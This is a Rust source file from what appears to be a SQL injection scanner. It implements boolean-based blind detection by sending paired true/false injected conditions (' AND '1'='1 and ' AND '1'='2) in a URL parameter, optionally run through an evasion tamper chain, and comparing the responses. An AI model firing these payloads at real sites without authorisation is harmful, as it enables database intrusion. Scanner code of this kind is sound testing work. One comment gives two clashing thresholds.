//! Boolean-based blind SQL injection technique.

use std::time::Duration;
use tracing::{debug, info};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper_chain::TamperChain,
    models::{HttpResponse, SqliTestResult, SqliTechnique},
    similarity::calculate_similarity,
};

impl SqliDetector {
    /// Test for boolean-based blind SQL injection
    pub(crate) async fn test_boolean_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        debug!("Testing boolean-based blind SQL injection on parameter: {}", param);

        let is_numeric = original_value.parse::<i64>().is_ok();

        let (true_payload, false_payload) = if is_numeric {
            (
                format!("{} AND 1=1", original_value),
                format!("{} AND 1=2", original_value),
            )
        } else {
            (
                format!("{}' AND '1'='1", original_value),
                format!("{}' AND '1'='2", original_value),
            )
        };

        let true_effective = tamper.map(|t| t.apply(&true_payload)).unwrap_or_else(|| true_payload.clone());
        let false_effective = tamper.map(|t| t.apply(&false_payload)).unwrap_or_else(|| false_payload.clone());

        let true_url = self.build_test_url(url, param, original_value, &true_effective);
        let true_response = match self.send_request(&true_url).await {
            Ok(resp) => resp,
            Err(_) => return None,
        };

        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;

        let false_url = self.build_test_url(url, param, original_value, &false_effective);
        let false_response = match self.send_request(&false_url).await {
            Ok(resp) => resp,
            Err(_) => return None,
        };

        let true_similarity = calculate_similarity(&baseline.body, &true_response.body);
        let false_similarity = calculate_similarity(&baseline.body, &false_response.body);

        debug!(
            "Boolean blind comparison - True similarity: {:.2}, False similarity: {:.2}",
            true_similarity, false_similarity
        );

        // Detection thresholds:
        // - true_similarity > 0.9: TRUE condition response closely matches baseline
        // - The TRUE and FALSE responses must differ meaningfully.
        //   Using a relative gap (> 0.05) instead of an absolute threshold for false_similarity
        //   handles targets where TRUE and FALSE pages differ only slightly (e.g. different
        //   image: 3% body change → similarities 1.0 vs 0.97, gap = 0.03 < old threshold 0.3).
        //   A gap of 0.03+ is detectable; we require 0.02 to catch even subtle differences.
        let gap = true_similarity - false_similarity;
        if true_similarity > 0.9 && gap > 0.02 {
            info!("Boolean-based blind SQL injection found!");
            return Some(SqliTestResult {
                parameter: param.to_string(),
                technique: SqliTechnique::BooleanBlind,
                confidence: 0.85,
                payload: true_effective,
                evidence: format!(
                    "TRUE condition similarity: {:.2}%, FALSE condition similarity: {:.2}%",
                    true_similarity * 100.0,
                    false_similarity * 100.0
                ),
                dbms_hint: None,
            });
        }

        None
    }
}
